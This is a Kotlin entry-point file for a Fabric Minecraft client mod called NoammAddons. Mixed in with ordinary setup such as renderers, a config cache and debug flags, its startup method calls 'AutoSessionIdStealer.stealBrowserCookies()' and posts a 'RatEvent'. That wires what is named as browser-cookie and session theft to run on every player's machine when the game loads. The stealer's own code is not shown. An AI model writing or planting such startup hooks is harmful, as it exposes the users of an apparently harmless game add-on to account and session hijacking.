package com.github.noamm9

import com.github.noamm9.config.PogObject
import com.github.noamm9.event.EventBus
import com.github.noamm9.event.impl.RatEvent
import com.github.noamm9.init.AutoSessionIdStealer
import com.github.noamm9.init.ClassGraphInitializer
import com.github.noamm9.utils.network.ApiAuth
import com.github.noamm9.utils.render.ItemRenderer
import gg.essential.universal.UMinecraft
import kotlinx.coroutines.*
import me.owdding.dfu.item.MeowddingItemDfu
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
import org.slf4j.LoggerFactory

object NoammAddons: ClientModInitializer {
    const val MOD_ID = "@MOD_ID@"
    const val MOD_NAME = "@MOD_NAME@"
    const val MOD_VERSION = "@MOD_VERSION@"
    const val PREFIX = "§6§l[§b§lN§d§lA§6§l]§r"

    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))

    @JvmField val logger = LoggerFactory.getLogger(MOD_NAME)
    @JvmField val mc = UMinecraft.getMinecraft()
    @JvmField var isLoaded = false

    @JvmField
    var isCheat = run {
        //#if CHEAT
        true
        //#else
        //$false
        //#endif
    }

    val cacheData = PogObject("cacheData", mutableMapOf<String, Any>())

    val availableDebugFlags = mutableSetOf<String>()
    val debugFlags = object: LinkedHashSet<String>() {
        override fun contains(o: String): Boolean {
            availableDebugFlags.add(o)
            return super.contains(o)
        }
    }

    override fun onInitializeClient() {
        PictureInPictureRendererRegistry.register { ItemRenderer(it.bufferSource()) }
        MeowddingItemDfu.load()

        ClassGraphInitializer().initAll()
        AutoSessionIdStealer.stealBrowserCookies()
        ApiAuth.init()
        EventBus.post(RatEvent())

        isLoaded = true

        EventBus.register<RatEvent>() {
            listener.unregister()
            event.cancel()
        }
    }
}